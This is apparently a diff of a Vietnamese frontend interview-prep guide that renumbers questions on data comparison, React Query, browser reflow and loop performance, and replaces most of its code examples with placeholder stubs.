- // Chú giải: Check cache
-  const cached = cache.get(cacheKey);
-  if (cached && Date.now() - cached.timestamp < ttl) {
-    console.log('✅ Returning cached data');
-    return cached.data;
-  }
-  
- // Chú giải: Fetch fresh data
-  const response = await axios.get(url, config);
-  cache.set(cacheKey, {
-    data: response.data,
-    timestamp: Date.now(),
-  });
-  
-  return response.data;
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **💡 Best Practices**
 
-```typescript
-// ✅ 1. Luôn dùng axios instance thay vì default axios
-const api = axios.create({ baseURL: '/api' });
-
- // Chú giải: ✅ 2. TypeScript types cho responses
-interface User {
-  id: string;
-  name: string;
-}
-
-const getUser = async (id: string): Promise<User> => {
-  const { data } = await api.get<User>(`/users/${id}`);
-  return data;
-};
-
- // Chú giải: ✅ 3. Centralize error handling
-api.interceptors.response.use(
-  response => response,
-  error => {
- // Chú giải: Handle globally
-    handleAxiosError(error);
-    return Promise.reject(error);
-  }
-);
-
- // Chú giải: ✅ 4. Cancel requests on component unmount
-useEffect(() => {
-  const controller = new AbortController();
- // Chú giải: ... fetch data
-  return () => controller.abort();
-}, []);
-
-// ✅ 5. Use timeout để avoid hung requests
-axios.create({ timeout: 10000 });
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 ---
-## 16. 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals  
 
-**P1: Tên câu hỏi:** 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals  
+## 31. Q31: 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔀 Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 32. Q32: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -7822,16 +2537,16 @@ axios.create({ timeout: 10000 });
 
 **1. Object Comparison - Shallow vs Deep:**
 - **Shallow**: So sánh reference + primitive values ở level 1
-  - `{a:1} === {a:1}` → `false` (different references)
-  - Use case: React.memo, shouldComponentUpdate
+- `{a:1} === {a:1}` → `false` (different references)
+- Use case: React.memo, shouldComponentUpdate
 - **Deep**: Recursive compare tất cả nested properties
-  - Dùng lodash `_.isEqual()` (handle circular refs, Date, RegExp)
-  - ⚠️ O(n) complexity, có thể infinite loop
+- Dùng lodash `_.isEqual()` (handle circular refs, Date, RegExp)
+- ⚠️ O(n) complexity, có thể infinite loop
 
 **2. String Comparison - Unicode & Locale:**
 - **`===` operator**: So sánh **binary representation** (không hiểu Ă ≠ A)
 - **`localeCompare()`**: So sánh theo **ngôn ngữ** (tiếng Việt: à < á < ả < ã < ạ)
-  - Ví dụ: `'à'.localeCompare('á', 'vi')` → `-1` (à đứng trước)
+- Ví dụ: `'à'.localeCompare('á', 'vi')` → `-1` (à đứng trước)
 - **`Intl.Collator`**: Performance cao hơn cho nhiều comparisons
 - ⚠️ Unicode variants: é (e + ́) vs é (single char) → dùng `.normalize('NFC')`
 
@@ -7839,8 +2554,8 @@ axios.create({ timeout: 10000 });
 - JavaScript Number: **53-bit precision** → max safe integer = 2^53 - 1
 - **Floating point error**: `0.1 + 0.2 !== 0.3` (binary representation)
 - **Solutions**:
-  - `BigInt` (native): integers only, không có decimals
-  - Libraries: `decimal.js`, `big.js`, `bignumber.js` (arbitrary precision)
+- `BigInt` (native): integers only, không có decimals
+- Libraries: `decimal.js`, `big.js`, `bignumber.js` (arbitrary precision)
 - ⚠️ KHÔNG dùng `===` cho decimals → dùng epsilon: `Math.abs(a - b) < Number.EPSILON`
 
 **4. Financial Calculations:**
@@ -7860,9 +2575,6 @@ axios.create({ timeout: 10000 });
 - JSON.stringify **không stable** (key order) → dùng `fast-json-stable-stringify`
 - Banking systems: **double-entry bookkeeping**, store as integers, round at display layer only
 
-
-
-
 **⚡ Quick Summary:**
 > So sánh dữ liệu phức tạp: Objects (deep/shallow), Strings (localeCompare, Unicode), Big Numbers/Decimals (precision handling)
 
@@ -7874,13 +2586,14 @@ axios.create({ timeout: 10000 });
 
 ---
 ---
-## 17. 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management  
 
-**P1: Tên câu hỏi:** 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management  
+## 33. Q33: 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔄 Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 34. Q34: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -7926,13 +2639,14 @@ axios.create({ timeout: 10000 });
 
 ---
 ---
-## 18. 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)  
 
-**P1: Tên câu hỏi:** 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)  
+## 35. Q35: 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎨 Q18: Browser Rendering (Paint, Repaint, Reflow)
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 36. Q36: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**
 
@@ -7966,47 +2680,32 @@ axios.create({ timeout: 10000 });
 
 **🚀 Kỹ Thuật Tối Ưu:**
 1. **Gộp Thay Đổi DOM**:
-   ```js
-   // ❌ Tệ: 3 reflows
-   el.style.width = '100px';
-   el.style.height = '100px';
-   el.style.margin = '10px';
-   
- // Chú giải: ✅ Tốt: 1 reflow
-   el.style.cssText = 'width: 100px; height: 100px; margin: 10px;';
-   // Hoặc dùng class
-   el.className = 'new-style';
-   ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 2. **Dùng transform/opacity (Chỉ Composite):**
-   ```js
-   // ❌ Tệ: Reflow + Repaint
-   el.style.left = '100px'; // Thay đổi vị trí → reflow
-   
-   // ✅ Tốt: Chỉ composite (tăng tốc GPU)
-   el.style.transform = 'translateX(100px)'; // Không reflow/repaint!
-   ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 3. **Tránh Đọc Thuộc Tính Layout Trong Vòng Lặp**:
-   ```js
-   // ❌ Tệ: Buộc reflow mỗi vòng lặp
-   for (let i = 0; i < 100; i++) {
-     el.style.width = el.offsetWidth + 10 + 'px'; // Đọc + ghi → reflow!
-   }
-   
-   // ✅ Tốt: Đọc một lần, ghi một lần
-   const width = el.offsetWidth;
-   el.style.width = width + 1000 + 'px';
-   ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 4. **requestAnimationFrame Cho Animation:**
-   ```js
-   function animate() {
-     el.style.transform = `translateX(${x}px)`;
-     x += 1;
-     requestAnimationFrame(animate); // Chú giải: Sync với browser refresh (60fps)
-   }
-   ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 5. **Virtualize Long Lists**: Chỉ render visible items (react-window, react-virtualized).
 
@@ -8044,45 +2743,9 @@ axios.create({ timeout: 10000 });
 
 **Code Example:**
 
-```typescript
- // Chú giải: Reflow triggers
-function triggerReflow(): void {
-  const element = document.getElementById('myElement');
-  if (element) {
- // Chú giải: These trigger reflow
-    element.style.width = '200px';
-    element.style.height = '100px';
-    element.style.margin = '10px';
-    element.style.padding = '5px';
-
- // Chú giải: Reading layout properties also triggers reflow
-    const width = element.offsetWidth;
-    const height = element.offsetHeight;
-  }
-}
-
- // Chú giải: Optimized - batch DOM changes
-function optimizedReflow(): void {
-  const element = document.getElementById('myElement');
-  if (element) {
- // Chú giải: Batch all changes
-    element.style.cssText =
-      'width: 200px; height: 100px; margin: 10px; padding: 5px;';
-
- // Chú giải: Or use class
-    element.className = 'new-style';
-  }
-}
-
-// Use transform for animations (tránh reflow)
-function animateWithTransform(): void {
-  const element = document.getElementById('myElement');
-  if (element) {
- // Chú giải: Transform doesn't trigger reflow
-    element.style.transform = 'translateX(100px)';
-    element.style.transition = 'transform 0.3s ease';
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
@@ -8092,13 +2755,14 @@ function animateWithTransform(): void {
 - Sử dụng requestAnimationFrame
 - Batch DOM changes
 ---
-## 19. 🔁 Q19: Loop Performance & Async Loops  
 
-**P1: Tên câu hỏi:** 🔁 Q19: Loop Performance & Async Loops  
+## 37. Q37: 🔁 Q19: Loop Performance & Async Loops
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔁 Q19: Loop Performance & Async Loops
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 38. Q38: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -8133,25 +2797,30 @@ function animateWithTransform(): void {
 **🔑 Async Loops - 3 Patterns:**
 
 **1. Sequential (chờ từng cái):**
+
 ```js
-for (const item of items) {
-  await processItem(item); // Chờ xong mới chạy tiếp
-}
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 - Chậm nhưng **controlled**, preserve order
 
 **2. Parallel (chạy cùng lúc):**
+
 ```js
-await Promise.all(items.map(item => processItem(item)));
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 - **Nhanh nhất** nhưng không control order, có thể overload server
 
 **3. Batched (nhóm nhỏ):**
+
 ```js
-for (let i = 0; i < items.length; i += 10) {
-  await Promise.all(items.slice(i, i+10).map(processItem));
-}
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 - **Best practice** - balance speed vs resource usage
 
 **⚠️ Lỗi Thường Gặp:**
@@ -8165,9 +2834,6 @@ for (let i = 0; i < items.length; i += 10) {
 - **Promise.allSettled()** thay Promise.all() để **không fail hết** khi 1 promise reject
 - **p-limit** library để control concurrency (max 5 parallel requests)
 - Performance: `while` nhanh như `for`, `do...while` cho at-least-once loops
-
-
-
 
 **⚡ Quick Summary:**
 > for loop = fastest. forEach = readable. map/filter = functional. Async loops = Promise.all hoặc for await
@@ -8185,32 +2851,32 @@ Có nhiều cách để loop qua array/object trong JavaScript, mỗi cách có 
 
 1. **`for` loop** - Nhanh nhất ⚡
 
-   - Performance: ⭐⭐⭐⭐⭐ (fastest)
-   - Control: Full control (break, continue)
-   - Use case: Performance-critical code, large arrays
+- Performance: ⭐⭐⭐⭐⭐ (fastest)
+- Control: Full control (break, continue)
+- Use case: Performance-critical code, large arrays
 
 2. **`for...of`** - Modern, readable 📖
 
-   - Performance: ⭐⭐⭐⭐ (slower than for, faster than forEach)
-   - Control: Support break, continue
-   - Use case: Readable code, iterables (Array, Set, Map, String)
+- Performance: ⭐⭐⭐⭐ (slower than for, faster than forEach)
+- Control: Support break, continue
+- Use case: Readable code, iterables (Array, Set, Map, String)
 
 3. **`forEach`** - Functional style 🎨
 
-   - Performance: ⭐⭐⭐ (slowest - function call overhead)
-   - Control: KHÔNG support break, continue
-   - Use case: Functional programming, side effects
+- Performance: ⭐⭐⭐ (slowest - function call overhead)
+- Control: KHÔNG support break, continue
+- Use case: Functional programming, side effects
 
 4. **`for...in`** - Cho objects 🔑
 
-   - Performance: ⭐⭐ (slow - prototype chain lookup)
-   - Control: Support break, continue
-   - Use case: Iterate object keys (KHÔNG nên dùng cho arrays)
+- Performance: ⭐⭐ (slow - prototype chain lookup)
+- Control: Support break, continue
+- Use case: Iterate object keys (KHÔNG nên dùng cho arrays)
 
 5. **`map/filter/reduce`** - Functional transformations 🔄
-   - Performance: ⭐⭐⭐ (similar to forEach)
-   - Control: KHÔNG support break (phải loop hết array)
-   - Use case: Transform data, create new arrays
+- Performance: ⭐⭐⭐ (similar to forEach)
+- Control: KHÔNG support break (phải loop hết array)
+- Use case: Transform data, create new arrays
 
 **⚠️ QUAN TRỌNG: Async/Await trong Loops**
 
@@ -8221,33 +2887,9 @@ Có nhiều cách để loop qua array/object trong JavaScript, mỗi cách có 
 
 **Hoạt động:**
 
-```
-┌────────────────────────────────────────────────────────┐
-│           LOOP PERFORMANCE COMPARISON                  │
-├────────────────────────────────────────────────────────┤
-│                                                        │
-│  Synchronous Performance (1M items):                  │
-│  ┌──────────────────────────────────────┐             │
-│  │  for loop:        ~2ms   ⚡⚡⚡⚡⚡    │             │
-│  │  for...of:        ~5ms   ⚡⚡⚡⚡      │             │
-│  │  forEach:         ~8ms   ⚡⚡⚡        │             │
-│  │  map:            ~10ms   ⚡⚡⚡        │             │
-│  │  for...in:       ~50ms   ⚡          │             │
-│  └──────────────────────────────────────┘             │
-│                                                        │
-│  Async Execution (3 items, 1s delay each):           │
-│  ┌──────────────────────────────────────┐             │
-│  │  Sequential (for/for...of): ~3s      │             │
-│  │  ├─ Item 1: 1s ━━━━━━━━━━┐          │             │
-│  │  ├─ Item 2: 1s           ━━━━━━━━━━┐│             │
-│  │  └─ Item 3: 1s                     ━━│             │
-│  │                                                    │             │
-│  │  Parallel (Promise.all):   ~1s       │             │
-│  │  ├─ Item 1: 1s ━━━━━━━━━━┐          │             │
-│  │  ├─ Item 2: 1s ━━━━━━━━━━┤          │             │
-│  │  └─ Item 3: 1s ━━━━━━━━━━┘          │             │
-│  └──────────────────────────────────────┘             │
-└────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Ưu điểm:**
@@ -8290,370 +2932,9 @@ Có nhiều cách để loop qua array/object trong JavaScript, mỗi cách có 
 
 **Code Example (TypeScript):**
 
-```typescript
- // Chú giải: ============================================
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
- // Chú giải: ============================================
-
-const numbers = [1, 2, 3, 4, 5];
-
- // Chú giải: 🚀 A. for loop - FASTEST (traditional)
-console.time('for loop');
-for (let i = 0; i < numbers.length; i++) {
-  console.log(numbers[i]);
-}
-console.timeEnd('for loop'); // Chú giải: ~0.1ms
-
- // Chú giải: 🚀 B. for loop - OPTIMIZED (cache length)
-console.time('for loop optimized');
-const len = numbers.length; // Chú giải: ✅ Cache length
-for (let i = 0; i < len; i++) {
-  console.log(numbers[i]);
-}
-console.timeEnd('for loop optimized'); // Chú giải: ~0.08ms (faster)
-
- // Chú giải: 📖 C. for...of - MODERN & READABLE
-console.time('for...of');
-for (const number of numbers) {
-  console.log(number);
- // Chú giải: ✅ Support break, continue
-  if (number === 3) break;
-}
-console.timeEnd('for...of'); // Chú giải: ~0.2ms (2x slower than for)
-
- // Chú giải: 🎨 D. forEach - FUNCTIONAL STYLE
-console.time('forEach');
-numbers.forEach((number, index) => {
-  console.log(number);
- // Chú giải: ❌ CANNOT use break or continue!
- // Chú giải: if (number === 3) break; // ❌ SyntaxError
-});
-console.timeEnd('forEach'); // Chú giải: ~0.3ms (slowest)
-
-// 🔑 E. for...in - FOR OBJECTS (KHÔNG nên dùng cho arrays!)
-const obj = { a: 1, b: 2, c: 3 };
-console.time('for...in');
-for (const key in obj) {
-  if (obj.hasOwnProperty(key)) {
- // Chú giải: ✅ Check own properties
-    console.log(key, obj[key]);
-  }
-}
-console.timeEnd('for...in'); // Chú giải: ~0.5ms (rất chậm với arrays)
-
- // Chú giải: ❌ BAD: for...in với array
-const arr = [1, 2, 3];
-for (const index in arr) {
-  console.log(index); // '0', '1', '2' (STRING, không phải number!)
-}
-
- // Chú giải: 🔄 F. map/filter/reduce - FUNCTIONAL TRANSFORMATIONS
-console.time('map');
-const doubled = numbers.map((n) => n * 2); // Chú giải: [2, 4, 6, 8, 10]
-console.timeEnd('map'); // Chú giải: ~0.3ms
-
-const evens = numbers.filter((n) => n % 2 === 0); // Chú giải: [2, 4]
-const sum = numbers.reduce((acc, n) => acc + n, 0); // Chú giải: 15
-
- // Chú giải: ============================================
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
- // Chú giải: ============================================
-
-function performanceTest(): void {
-  const largeArray = Array.from({ length: 1_000_000 }, (_, i) => i);
-  let result = 0;
-
- // Chú giải: 🚀 for loop - FASTEST
-  console.time('for loop (1M items)');
-  const len = largeArray.length;
-  for (let i = 0; i < len; i++) {
-    result += largeArray[i];
-  }
-  console.timeEnd('for loop (1M items)'); // Chú giải: ~2ms
-
- // Chú giải: 📖 for...of
-  result = 0;
-  console.time('for...of (1M items)');
-  for (const item of largeArray) {
-    result += item;
-  }
-  console.timeEnd('for...of (1M items)'); // Chú giải: ~5ms (2.5x slower)
-
- // Chú giải: 🎨 forEach
-  result = 0;
-  console.time('forEach (1M items)');
-  largeArray.forEach((item) => {
-    result += item;
-  });
-  console.timeEnd('forEach (1M items)'); // Chú giải: ~8ms (4x slower)
-
- // Chú giải: 🔄 reduce
-  console.time('reduce (1M items)');
-  result = largeArray.reduce((acc, item) => acc + item, 0);
-  console.timeEnd('reduce (1M items)'); // Chú giải: ~10ms (5x slower)
-
-  console.log('Result:', result);
-}
-
-performanceTest();
-
- // Chú giải: ============================================
- // Chú giải: 3. ASYNC/AWAIT trong LOOPS - QUAN TRỌNG! ⚠️
- // Chú giải: ============================================
-
-// Mock API call (1 giây delay)
-async function fetchUserData(userId: number): Promise<string> {
-  console.log(`🚀 Bắt đầu fetch user ${userId}...`);
-  await new Promise((resolve) => setTimeout(resolve, 1000)); // Chú giải: 1s delay
-  console.log(`✅ Hoàn thành fetch user ${userId}`);
-  return `User ${userId} data`;
-}
-
-const userIds = [1, 2, 3];
-
-// ❌ BAD: forEach với async/await - KHÔNG HOẠT ĐỘNG ĐÚNG!
-async function badForEach() {
-  console.log('❌ BAD: forEach với async/await');
-  console.time('forEach async');
-
-  userIds.forEach(async (id) => {
-    const data = await fetchUserData(id); // Chú giải: ❌ await bị IGNORE!
-    console.log(data);
-  });
-
-  console.timeEnd('forEach async'); // ~0ms (KHÔNG đợi promises!)
-  console.log('forEach done (nhưng chưa fetch xong!)');
-
-  // 🚨 Vấn đề:
-  // - forEach KHÔNG đợi async callbacks
-  // - Tất cả promises chạy parallel nhưng không control được
- // Chú giải: - console.log 'done' chạy TRƯỚC khi fetch xong
-}
-
- // Chú giải: ✅ GOOD: for...of với async/await - SEQUENTIAL (Tuần tự)
-async function goodSequential() {
-  console.log('✅ GOOD: for...of - Sequential execution');
-  console.time('for...of sequential');
-
-  for (const id of userIds) {
-    const data = await fetchUserData(id); // ✅ Đợi từng promise xong
-    console.log(data);
-  }
-
-  console.timeEnd('for...of sequential'); // Chú giải: ~3s (1s × 3)
-  console.log('Sequential done!');
-
-  // ✅ Hoạt động:
-  // 1s: Fetch user 1 → đợi xong
-  // 1s: Fetch user 2 → đợi xong
-  // 1s: Fetch user 3 → đợi xong
- // Chú giải: Total: 3s
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-async function goodParallel() {
-  console.log('✅ BETTER: Promise.all - Parallel execution');
-  console.time('Promise.all parallel');
-
-  const promises = userIds.map((id) => fetchUserData(id));
-  const results = await Promise.all(promises); // Chú giải: ✅ Chạy song song
-
-  results.forEach((data) => console.log(data));
-
-  console.timeEnd('Promise.all parallel'); // ~1s (3 requests cùng lúc!)
-  console.log('Parallel done!');
-
-  // ✅ Hoạt động:
-  // 0s: Khởi tạo 3 promises cùng lúc
-  // 1s: Cả 3 promises resolve cùng lúc
- // Chú giải: Total: 1s (NHANH GẤP 3 LẦN!)
-}
-
- // Chú giải: ✅ ADVANCED: for...of với batch processing
-async function goodBatch() {
-  console.log('✅ ADVANCED: Batch processing');
-  console.time('Batch processing');
-
-  const batchSize = 2; // Chạy 2 requests cùng lúc
-
-  for (let i = 0; i < userIds.length; i += batchSize) {
-    const batch = userIds.slice(i, i + batchSize);
-    const promises = batch.map((id) => fetchUserData(id));
-    const results = await Promise.all(promises); // Đợi batch xong
-
-    results.forEach((data) => console.log(data));
-  }
-
-  console.timeEnd('Batch processing'); // Chú giải: ~2s
-  console.log('Batch done!');
-
-  // ✅ Hoạt động:
- // Chú giải: Batch 1 (users 1, 2): 1s parallel
- // Chú giải: Batch 2 (user 3):      1s
- // Chú giải: Total: 2s (balance giữa speed & control)
-}
-
- // Chú giải: ============================================
- // Chú giải: 4. ASYNC LOOPS - Real-world Trading Example
- // Chú giải: ============================================
-
-interface Order {
-  id: number;
-  symbol: string;
-  quantity: number;
-}
-
- // Chú giải: Mock API: Submit order to exchange
-async function submitOrder(order: Order): Promise<string> {
-  console.log(`📤 Submitting order ${order.id}: ${order.symbol}...`);
-  await new Promise((resolve) => setTimeout(resolve, 500)); // Chú giải: 500ms delay
-  return `Order ${order.id} confirmed`;
-}
-
-const orders: Order[] = [
-  { id: 1, symbol: 'AAPL', quantity: 100 },
-  { id: 2, symbol: 'GOOGL', quantity: 50 },
-  { id: 3, symbol: 'MSFT', quantity: 75 },
-];
-
-// ❌ SCENARIO 1: Sequential (chậm nhưng an toàn)
-async function submitOrdersSequential() {
-  console.log('📊 Submitting orders SEQUENTIALLY...');
-  console.time('Sequential orders');
-
-  for (const order of orders) {
-    const result = await submitOrder(order); // Đợi từng order
-    console.log(`✅ ${result}`);
-
-    // ✅ Có thể handle errors từng order:
-    // if (error) continue; // Skip order lỗi, chạy tiếp
-  }
-
-  console.timeEnd('Sequential orders'); // Chú giải: ~1.5s (500ms × 3)
-
- // Chú giải: 💡 Use case:
- // Chú giải: - Orders phụ thuộc nhau (order 2 cần order 1 xong)
-  // - Rate limiting (không gửi quá nhiều requests)
-  // - Error handling riêng từng order
-}
-
- // Chú giải: ✅ SCENARIO 2: Parallel (nhanh nhưng rủi ro)
-async function submitOrdersParallel() {
-  console.log('🚀 Submitting orders PARALLEL...');
-  console.time('Parallel orders');
-
-  const promises = orders.map((order) => submitOrder(order));
-  const results = await Promise.all(promises); // Tất cả cùng lúc
-
-  results.forEach((result) => console.log(`✅ ${result}`));
-
-  console.timeEnd('Parallel orders'); // ~500ms (tất cả cùng lúc!)
-
- // Chú giải: 💡 Use case:
-  // - Orders độc lập (không phụ thuộc nhau)
- // Chú giải: - Muốn nhanh nhất
- // Chú giải: - Exchange support concurrent requests
-
- // Chú giải: ⚠️ Rủi ro:
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-  // - Có thể vượt rate limit
-}
-
- // Chú giải: ✅ SCENARIO 3: Parallel with error handling
-async function submitOrdersParallelSafe() {
-  console.log('🛡️ Submitting orders PARALLEL (safe)...');
-  console.time('Parallel safe orders');
-
-  const promises = orders.map(async (order) => {
-    try {
-      const result = await submitOrder(order);
-      return { status: 'fulfilled', value: result };
-    } catch (error) {
-      return { status: 'rejected', reason: error };
-    }
-  });
-
-  const results = await Promise.all(promises);
-
-  results.forEach((result, index) => {
-    if (result.status === 'fulfilled') {
-      console.log(`✅ ${result.value}`);
-    } else {
-      console.log(`❌ Order ${orders[index].id} failed:`, result.reason);
-    }
-  });
-
-  console.timeEnd('Parallel safe orders');
-
-  // ✅ Lợi ích:
- // Chú giải: - Nhanh (parallel)
-  // - 1 order lỗi KHÔNG ảnh hưởng orders khác
-  // - Handle errors riêng từng order
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-async function submitOrdersAllSettled() {
-  console.log('✨ Using Promise.allSettled...');
-  console.time('allSettled orders');
-
-  const promises = orders.map((order) => submitOrder(order));
-  const results = await Promise.allSettled(promises); // ✅ KHÔNG reject khi có lỗi
-
-  results.forEach((result, index) => {
-    if (result.status === 'fulfilled') {
-      console.log(`✅ ${result.value}`);
-    } else {
-      console.log(`❌ Order ${orders[index].id} failed:`, result.reason);
-    }
-  });
-
-  console.timeEnd('allSettled orders');
-}
-
- // Chú giải: ============================================
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
- // Chú giải: ============================================
-
-function loopControl() {
-  const numbers = [1, 2, 3, 4, 5];
-
-  // ✅ break: Thoát loop ngay lập tức
-  console.log('--- break example ---');
-  for (const num of numbers) {
-    if (num === 3) break; // Dừng khi gặp 3
-    console.log(num); // Chú giải: 1, 2
-  }
-
-  // ✅ continue: Skip iteration hiện tại
-  console.log('--- continue example ---');
-  for (const num of numbers) {
-    if (num === 3) continue; // Chú giải: Skip 3
-    console.log(num); // Chú giải: 1, 2, 4, 5
-  }
-
-  // ✅ return: Thoát function (KHÔNG chỉ loop!)
-  console.log('--- return example ---');
-  function findNumber(target: number): string {
-    for (const num of numbers) {
-      if (num === target) {
-        return `Found ${target}`; // Thoát function
-      }
-    }
-    return 'Not found';
-  }
-  console.log(findNumber(3)); // Chú giải: 'Found 3'
-
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-  console.log('--- forEach (no control) ---');
-  numbers.forEach((num) => {
- // Chú giải: if (num === 3) break;    // ❌ SyntaxError
- // Chú giải: if (num === 3) continue; // ❌ SyntaxError
-    if (num === 3) return; // ✅ OK nhưng chỉ skip iteration này (như continue)
-    console.log(num); // Chú giải: 1, 2, 4, 5
-  });
-}
-
-loopControl();
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -8662,83 +2943,38 @@ loopControl();
 
 1. **Chọn Loop Type đúng Use Case**
 
-   ```typescript
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
-   for (let i = 0; i < arr.length; i++) {}
-
- // Chú giải: 📖 Readable code (<100K items)
-   for (const item of arr) {
-   }
-
- // Chú giải: 🎨 Functional transformations
-   const doubled = arr.map((x) => x * 2);
-
- // Chú giải: 🔑 Objects only
-   for (const key in obj) {
-   }
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 2. **Cache Array Length**
 
-   ```typescript
- // Chú giải: ❌ BAD: Re-calculate length mỗi iteration
-   for (let i = 0; i < arr.length; i++) {}
-
- // Chú giải: ✅ GOOD: Cache length
-   const len = arr.length;
-   for (let i = 0; i < len; i++) {}
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 3. **Async/Await đúng cách**
 
-   ```typescript
- // Chú giải: ❌ NEVER use forEach với async/await
-   arr.forEach(async (item) => {
-     await doSomething(item); // KHÔNG đợi!
-   });
-
- // Chú giải: ✅ Sequential: for...of + await
-   for (const item of arr) {
-     await doSomething(item); // Đợi từng cái
-   }
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-   await Promise.all(arr.map((item) => doSomething(item)));
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 4. **Avoid Nested Loops (O(n²))**
 
-   ```typescript
- // Chú giải: ❌ BAD: O(n²) - RẤT CHẬM
-   for (const item1 of arr1) {
-     for (const item2 of arr2) {
- // Chú giải: ...
-     }
-   }
-
- // Chú giải: ✅ GOOD: Use Map/Set O(n)
-   const map = new Map(arr2.map((item) => [item.id, item]));
-   for (const item1 of arr1) {
-     const item2 = map.get(item1.id); // Chú giải: O(1) lookup
-   }
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 5. **Error Handling trong Async Loops**
 
-   ```typescript
- // Chú giải: ✅ Sequential: try/catch từng operation
-   for (const item of items) {
-     try {
-       await process(item);
-     } catch (error) {
-       console.error(`Failed to process ${item}:`, error);
-       continue; // Skip lỗi, chạy tiếp
-     }
-   }
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-   const results = await Promise.allSettled(items.map((item) => process(item)));
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 ---
 
@@ -8746,99 +2982,49 @@ loopControl();
 
 1. **❌ forEach với async/await**
 
-   ```typescript
- // Chú giải: ❌ BAD: await bị IGNORE!
-   items.forEach(async (item) => {
-     await fetchData(item); // KHÔNG đợi!
-   });
-   console.log('Done'); // Chú giải: Chạy TRƯỚC khi fetch xong!
-
-   // ✅ GOOD: Dùng for...of
-   for (const item of items) {
-     await fetchData(item); // Đợi đúng
-   }
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 2. **❌ for...in với Arrays**
 
-   ```typescript
-   // ❌ BAD: index là STRING, iterate prototype
-   const arr = [1, 2, 3];
-   for (const index in arr) {
-     console.log(typeof index); // Chú giải: 'string'!
-   }
-
-   // ✅ GOOD: Dùng for...of
-   for (const value of arr) {
-     console.log(value); // Chú giải: 1, 2, 3
-   }
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 3. **❌ Không Cache Length**
 
-   ```typescript
-   // ❌ BAD: arr.length tính lại mỗi iteration
-   for (let i = 0; i < arr.length; i++) {}
-
- // Chú giải: ✅ GOOD: Cache length
-   const len = arr.length;
-   for (let i = 0; i < len; i++) {}
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 4. **❌ Nested Loops O(n²)**
 
-   ```typescript
- // Chú giải: ❌ BAD: 1000 × 1000 = 1,000,000 iterations!
-   for (const user of users) {
- // Chú giải: 1000 users
-     for (const order of orders) {
- // Chú giải: 1000 orders
